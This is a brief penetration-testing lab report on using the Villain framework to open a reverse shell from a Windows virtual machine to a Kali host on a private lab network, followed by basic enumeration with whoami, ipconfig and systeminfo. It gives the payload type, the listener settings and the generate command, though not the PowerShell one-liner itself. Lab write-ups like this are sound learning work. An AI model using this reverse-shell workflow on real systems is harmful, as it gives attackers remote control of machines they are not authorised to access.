# Villain Framework Reverse Shell Report

## Setup Info
- **Payload:** `windows/reverse_tcp/powershell`
- **LHOST:** `192.168.56.101`
- **LPORT:** `8080`

## Payload Delivery Method
The reverse shell payload was generated using the Villain framework with the following command:
generate os=windows lhost=eth1

Villain produced a PowerShell one-liner that was executed on the target Windows virtual machine. This established a reverse connection from the target back to the attacker's Kali Linux machine, enabling command execution.

## Captured Info
- **Hostname:** `DESKTOP-5J4845E`
- **IP Address:** `192.168.56.1`
- **User:** `Windows`

## Enumeration Performed
```powershell
whoami
# Output:
desktop-5j4845e\windows

ipconfig
# Output:
Ethernet adapter details showing IP 192.168.56.1 and network configuration.

systeminfo
# Output:
Displayed OS Name, Version, Build Number, Registered Owner, System Manufacturer, System Model, Processor details, BIOS version, and other hardware/software information.


Observations
Villain successfully established a reverse shell connection to the target VM.

Commands executed remotely returned accurate system information from the target machine.

The test confirmed that Villain can be used for controlled penetration testing in a safe lab environment.
